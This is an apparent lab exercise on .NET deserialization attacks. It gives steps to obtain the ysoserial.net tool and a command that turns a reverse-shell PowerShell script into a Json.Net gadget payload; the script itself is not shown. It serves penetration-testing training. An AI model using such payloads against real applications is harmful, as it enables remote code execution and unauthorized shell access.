# Exercise 2 - .NET Deserialization



https://github.com/pwntester/ysoserial.net

# Using Ysoserial.net

```
git clone https://github.com/pwntester/ysoserial.net
<<Build with visual studio / MsBuild>>
```

or download the precompiled tool ([see download badge](https://github.com/pwntester/ysoserial.net))

```
cat powershell_reverse.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net –s
```
